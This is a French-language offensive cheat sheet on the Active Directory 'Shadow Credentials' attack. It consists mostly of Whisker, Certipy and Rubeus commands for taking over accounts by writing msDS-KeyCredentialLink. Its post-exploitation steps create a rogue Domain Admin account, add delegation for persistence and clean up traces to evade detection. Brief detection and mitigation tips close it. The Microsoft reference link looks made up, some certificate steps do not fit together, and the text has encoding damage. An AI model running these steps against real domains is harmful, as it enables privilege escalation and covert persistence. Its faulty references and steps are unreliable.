---
title: Shadow Credentials
date: "2025-07-15"
draft: false
---

# ðŸ‘¤ Shadow Credentials - Cheat Sheet

## ðŸŽ¯ Vue d'ensemble
Les Shadow Credentials sont une technique d'attaque Active Directory qui permet d'ajouter des clÃ©s publiques aux attributs msDS-KeyCredentialLink d'un objet AD pour obtenir des privilÃ¨ges Ã©levÃ©s.

---

## ðŸ” DÃ©tection et Ã‰numÃ©ration

### Identification des Cibles
```powershell
# Recherche d'objets avec des Shadow Credentials
# Pourquoi : Identifier les objets AD qui ont des Shadow Credentials
Get-ADObject -Filter {msDS-KeyCredentialLink -like "*"} -Properties msDS-KeyCredentialLink,SamAccountName

# Recherche avec LDAP
# Pourquoi : Utiliser LDAP pour une recherche directe
ldapsearch -H ldap://DC_IP -D "DOMAIN\USER" -w PASSWORD -b "DC=DOMAIN,DC=LOCAL" "(&(objectClass=user)(msDS-KeyCredentialLink=*))" sAMAccountName msDS-KeyCredentialLink

# Recherche avec PowerView
# Pourquoi : Utiliser PowerView pour une Ã©numÃ©ration avancÃ©e
Get-DomainUser -Properties msDS-KeyCredentialLink | Where-Object {$_.msDS-KeyCredentialLink}
```

### Ã‰numÃ©ration des Permissions
```powershell
# VÃ©rification des permissions sur les objets
# Pourquoi : Identifier qui peut modifier les attributs msDS-KeyCredentialLink
Get-ACL -Path "AD:CN=TARGET_USER,CN=Users,DC=domain,DC=local" | Format-List

# Recherche des groupes avec permissions
# Pourquoi : Identifier les groupes qui peuvent ajouter des Shadow Credentials
Get-ADGroup -Filter {Name -like "*Cert*"} -Properties Members
```

---

## ðŸ› ï¸ Outils d'Exploitation

### Whisker
```powershell
# Installation de Whisker
# Pourquoi : Outil spÃ©cialisÃ© pour les Shadow Credentials
# TÃ©lÃ©charger depuis: https://github.com/eladshamir/Whisker

# Ajout de Shadow Credentials
# Pourquoi : Ajouter des Shadow Credentials Ã  un objet AD
Whisker.exe add /target:TARGET_USER /domain:DOMAIN.LOCAL /dc:DC_IP /path:C:\path\to\cert.pfx

# Suppression de Shadow Credentials
# Pourquoi : Supprimer les Shadow Credentials ajoutÃ©s
Whisker.exe remove /target:TARGET_USER /domain:DOMAIN.LOCAL /dc:DC_IP /path:C:\path\to\cert.pfx
```

### Certipy
```bash
# Installation de Certipy
# Pourquoi : Outil pour l'exploitation des certificats AD
pip install certipy-ad

# Ajout de Shadow Credentials avec Certipy
# Pourquoi : Utiliser Certipy pour ajouter des Shadow Credentials
certipy-ad shadow auto -u USER@DOMAIN.LOCAL -p PASSWORD -target TARGET_USER -dc-ip DC_IP

# Authentification avec Shadow Credentials
# Pourquoi : S'authentifier avec les Shadow Credentials crÃ©Ã©s
certipy-ad auth -pfx TARGET_USER.pfx -dc-ip DC_IP
```

### PowerShell
```powershell
# Script PowerShell pour Shadow Credentials
# Pourquoi : Utiliser PowerShell pour l'exploitation des Shadow Credentials
# NÃ©cessite des modules spÃ©cifiques pour la manipulation des certificats

# GÃ©nÃ©ration de certificat
# Pourquoi : GÃ©nÃ©rer un certificat pour les Shadow Credentials
$cert = New-SelfSignedCertificate -Subject "CN=ShadowCred" -KeyAlgorithm RSA -KeyLength 2048

# Export du certificat
# Pourquoi : Exporter le certificat pour l'utilisation
Export-Certificate -Cert $cert -FilePath "shadow_cert.cer"
```

---

## ðŸŽ¯ Techniques d'Exploitation

### Ã‰tape 1: GÃ©nÃ©ration des Certificats
```bash
# GÃ©nÃ©ration avec OpenSSL
# Pourquoi : GÃ©nÃ©rer un certificat avec OpenSSL
openssl req -newkey rsa:2048 -keyout shadow.key -out shadow.csr -subj "/CN=ShadowCred"
openssl x509 -req -in shadow.csr -signkey shadow.key -out shadow.crt

# GÃ©nÃ©ration avec Certipy
# Pourquoi : Utiliser Certipy pour la gÃ©nÃ©ration automatique
certipy-ad shadow auto -u USER@DOMAIN.LOCAL -p PASSWORD -target TARGET_USER -dc-ip DC_IP
```

### Ã‰tape 2: Ajout des Shadow Credentials
```powershell
# Ajout avec Whisker
# Pourquoi : Ajouter les Shadow Credentials Ã  l'objet AD
Whisker.exe add /target:TARGET_USER /domain:DOMAIN.LOCAL /dc:DC_IP /path:C:\path\to\cert.pfx

# Ajout avec Certipy
# Pourquoi : Alternative avec Certipy
certipy-ad shadow auto -u USER@DOMAIN.LOCAL -p PASSWORD -target TARGET_USER -dc-ip DC_IP
```

### Ã‰tape 3: Authentification
```bash
# Authentification avec le certificat
# Pourquoi : S'authentifier avec les Shadow Credentials
certipy-ad auth -pfx TARGET_USER.pfx -dc-ip DC_IP

# Authentification avec Rubeus
# Pourquoi : Utiliser Rubeus pour l'authentification
Rubeus.exe asktgt /user:TARGET_USER /certificate:C:\path\to\cert.pfx /ptt
```

---

## ðŸ”§ Post-Exploitation

### Utilisation des PrivilÃ¨ges
```powershell
# VÃ©rification des privilÃ¨ges obtenus
# Pourquoi : VÃ©rifier les privilÃ¨ges obtenus avec les Shadow Credentials
whoami /priv
whoami /groups

# Ã‰numÃ©ration des ressources accessibles
# Pourquoi : Identifier les ressources accessibles avec les nouveaux privilÃ¨ges
Get-ADComputer -Filter * | ForEach-Object { Test-Path "\\$($_.Name)\C$" }
```

### Persistance
```powershell
# CrÃ©ation de comptes persistants
# Pourquoi : Maintenir l'accÃ¨s aprÃ¨s l'exploitation
New-ADUser -Name "EvilUser" -AccountPassword (ConvertTo-SecureString "EvilPass123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "DOMAIN ADMINS" -Members "EvilUser"

# Modification des ACLs
# Pourquoi : Modifier les permissions pour maintenir l'accÃ¨s
Set-ADObject -Identity "CN=EvilUser,CN=Users,DC=domain,DC=local" -Add @{msDS-AllowedToDelegateTo="krbtgt/DOMAIN.LOCAL"}
```

### Nettoyage
```powershell
# Suppression des Shadow Credentials
# Pourquoi : Supprimer les Shadow Credentials pour Ã©viter la dÃ©tection
Whisker.exe remove /target:TARGET_USER /domain:DOMAIN.LOCAL /dc:DC_IP /path:C:\path\to\cert.pfx

# Nettoyage des certificats
# Pourquoi : Supprimer les fichiers de certificats
Remove-Item "shadow_cert.cer"
Remove-Item "shadow.key"
Remove-Item "shadow.csr"
```

---

## ðŸ›¡ï¸ Contre-Mesures

### DÃ©tection
```powershell
# Surveillance des Shadow Credentials
# Pourquoi : DÃ©tecter les objets avec des Shadow Credentials
Get-ADObject -Filter {msDS-KeyCredentialLink -like "*"} -Properties msDS-KeyCredentialLink,SamAccountName | Export-Csv -Path "shadow_credentials.csv"

# Surveillance des modifications d'attributs
# Pourquoi : DÃ©tecter les modifications de l'attribut msDS-KeyCredentialLink
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5136} | Where-Object {$_.Message -like "*msDS-KeyCredentialLink*"}
```

### Mitigation
```powershell
# Suppression des Shadow Credentials
# Pourquoi : Supprimer les Shadow Credentials dangereux
Set-ADObject -Identity "CN=TARGET_USER,CN=Users,DC=domain,DC=local" -Clear "msDS-KeyCredentialLink"

# Restriction des permissions
# Pourquoi : Restreindre les permissions sur les attributs sensibles
# Utiliser des ACLs pour limiter l'accÃ¨s Ã  msDS-KeyCredentialLink
```

### Configuration SÃ©curisÃ©e
```powershell
# Politiques de sÃ©curitÃ© pour les certificats
# Pourquoi : Configurer des politiques pour limiter l'utilisation des certificats
# GPO: Computer Configuration > Windows Settings > Security Settings > Public Key Policies
# "Certificate Services Client - Auto-Enrollment" = Disabled
```

---

## ðŸ“š Ressources

- **Whisker GitHub** : https://github.com/eladshamir/Whisker
- **Certipy GitHub** : https://github.com/ly4k/Certipy
- **HackTricks Shadow Credentials** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/shadow-credentials
- **Microsoft Shadow Credentials** : https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/2c2c4c8c-0c8c-4c8c-8c8c-8c8c8c8c8c8c

---

_DerniÃ¨re mise Ã  jour : 15 juillet 2025_
